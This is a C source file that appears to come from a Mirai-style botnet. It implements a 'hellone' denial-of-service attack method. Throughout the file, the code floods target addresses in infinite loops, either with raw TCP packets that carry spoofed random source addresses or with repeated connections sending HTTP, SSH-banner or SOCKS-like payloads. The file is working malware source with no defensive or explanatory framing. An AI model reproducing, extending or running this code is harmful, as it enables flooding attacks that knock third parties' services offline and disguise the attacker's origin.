#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"

#define HELLONE_CONN_MAX 256

void attack_method_hellone(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, method, spoof, sock, burst;
    uint16_t dport;
    uint32_t payload_size, seq;
    uint8_t ip_ttl, ip_tos, dont_frag;
    uint16_t ip_ident;
    char *domain;

    method = attack_get_opt_int(opts_len, opts, ATK_OPT_METHOD, 0);
    spoof = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, 0);
    dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
    domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
    burst = attack_get_opt_int(opts_len, opts, ATK_OPT_BURST, 16);
    ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xFFFF);
    dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, 0);
    payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);

    if (burst < 4) burst = 4;
    if (burst > 256) burst = 256;
    if (payload_size > 1400) payload_size = 1400;

    char req_buf[2048];
    int reqlen = 0;

    if (method == 0) {
        char *host = domain ? domain : "localhost";
        reqlen = util_strcpy(req_buf, "GET / HTTP/1.1\r\n");
        reqlen += util_strcpy(req_buf + reqlen, "Host: ");
        reqlen += util_strcpy(req_buf + reqlen, host);
        reqlen += util_strcpy(req_buf + reqlen, "\r\n");
        reqlen += util_strcpy(req_buf + reqlen, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n");
        reqlen += util_strcpy(req_buf + reqlen, "Accept: */*\r\n");
        reqlen += util_strcpy(req_buf + reqlen, "Connection: keep-alive\r\n\r\n");
    } else if (method == 1) {
        reqlen = util_strcpy(req_buf, "SSH-2.0-Hellone_1.0\r\n");
    } else if (method == 2) {
        char *host = domain ? domain : "localhost";
        int hl = util_strlen(host);
        req_buf[0] = 0x10;
        req_buf[1] = 0x00;
        req_buf[2] = 0x00;
        req_buf[3] = 0x00;
        req_buf[4] = 0x00;
        req_buf[5] = hl + 5;
        req_buf[6] = 0x00;
        req_buf[7] = 0x00;
        req_buf[8] = 0x04;
        req_buf[9] = 0x00;
        req_buf[10] = (dport >> 8) & 0xff;
        req_buf[11] = dport & 0xff;
        req_buf[12] = 0x01;
        req_buf[13] = hl & 0xff;
        util_memcpy(req_buf + 14, host, hl);
        reqlen = 14 + hl;
    }

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(dport);

    if (spoof) {
        int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if (fd < 0) fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (fd < 0) return;
        i = 1;
        if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) < 0) { close(fd); return; }
        i = 16 * 1024 * 1024;
        setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &i, sizeof(i));

        int pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
        char pkt[pkt_size];
        struct iphdr *iph = (struct iphdr *)pkt;
        struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
        char *payload = pkt + sizeof(struct iphdr) + sizeof(struct tcphdr);
        char chk_data[sizeof(struct tcphdr) + payload_size];

        while (TRUE) {
            for (i = 0; i < targs_len; i++) {
                uint32_t target_addr = targs[i].netmask < 32 ?
                    htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask)) : targs[i].addr;
                target.sin_addr.s_addr = target_addr;

                memset(iph, 0, sizeof(*iph));
                iph->version = 4;
                iph->ihl = 5;
                iph->tos = ip_tos;
                iph->tot_len = htons(pkt_size);
                iph->id = htons(ip_ident == 0xFFFF ? (rand_next() & 0xFFFF) : ip_ident);
                iph->ttl = ip_ttl;
                if (dont_frag) iph->frag_off = htons(1 << 14);
                iph->protocol = IPPROTO_TCP;
                iph->saddr = rand_next();
                iph->daddr = target_addr;

                memset(tcph, 0, sizeof(*tcph));
                tcph->source = htons(rand_next() & 0xFFFF);
                tcph->dest = htons(dport);
                tcph->doff = 5;
                tcph->window = htons(65535);
                tcph->ack = 1;
                tcph->psh = 1;
                seq = rand_next();
                tcph->seq = htonl(seq);
                tcph->ack_seq = htonl(rand_next());

                if (reqlen > 0 && reqlen <= (int)payload_size)
                    util_memcpy(payload, req_buf, reqlen);
                else
                    rand_str(payload, payload_size);

                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(*iph));

                util_memcpy(chk_data, tcph, sizeof(*tcph) + payload_size);
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(*tcph) + payload_size), sizeof(*tcph) + payload_size);

                for (int b = 0; b < burst; b++)
                    sendto(fd, pkt, pkt_size, MSG_NOSIGNAL, (struct sockaddr *)&target, sizeof(target));
            }
        }
    } else {
        int *fds = calloc(HELLONE_CONN_MAX, sizeof(int));
        if (!fds) return;
        for (i = 0; i < HELLONE_CONN_MAX; i++) fds[i] = -1;

        while (TRUE) {
            for (i = 0; i < targs_len % HELLONE_CONN_MAX; i++) {
                int idx = (rand_next() % (HELLONE_CONN_MAX - 1)) + 1;
                if (fds[idx] >= 0) {
                    close(fds[idx]);
                    fds[idx] = -1;
                }
                target.sin_addr.s_addr = targs[i % targs_len].netmask < 32 ?
                    htonl(ntohl(targs[i % targs_len].addr) + (((uint32_t)rand_next()) >> targs[i % targs_len].netmask)) : targs[i % targs_len].addr;

                sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;
                fcntl(sock, F_SETFL, O_NONBLOCK);
                connect(sock, (struct sockaddr *)&target, sizeof(target));

                struct pollfd pfd = { sock, POLLOUT, 0 };
                if (poll(&pfd, 1, 5000) > 0 && (pfd.revents & POLLOUT)) {
                    if (reqlen > 0) send(sock, req_buf, reqlen, 0);
                    char buf[1024];
                    recv(sock, buf, sizeof(buf), MSG_DONTWAIT);
                }
                fds[idx] = sock;
            }
        }
        free(fds);
    }
}
